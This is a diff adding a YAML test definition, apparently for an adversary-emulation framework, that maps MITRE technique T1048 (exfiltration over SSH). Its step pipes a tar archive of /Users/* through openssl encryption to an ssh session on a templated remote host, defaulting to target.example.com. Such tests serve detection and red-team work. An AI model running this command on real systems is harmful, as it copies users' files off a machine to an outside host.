@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Exfiltration Over Alternative Protocol - SSH
+description: |
+    Input a domain and test Exfiltration over SSH
+
+    Local to Remote
+
+    Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
+args:
+    - name: user_name
+      type: string
+      default: atomic
+    - name: password
+      type: string
+      default: atomic
+    - name: domain
+      type: url
+      default: target.example.com
+uuid: 7c3cb337-35ae-4d06-bf03-3032ed2ec268
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1048: Exfiltration Over Alternative Protocol'
+requirements:
+    platforms:
+        - os: macos
+        - os: linux
+steps:
+    - name: exfiltration-over-alternative-protocol---ssh
+      inline: |
+        tar czpf - /Users/* | openssl des3 -salt -pass {{.Args.password}} | ssh {{.Args.user_name}}@{{.Args.domain}} 'cat > /Users.tar.gz.enc'
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
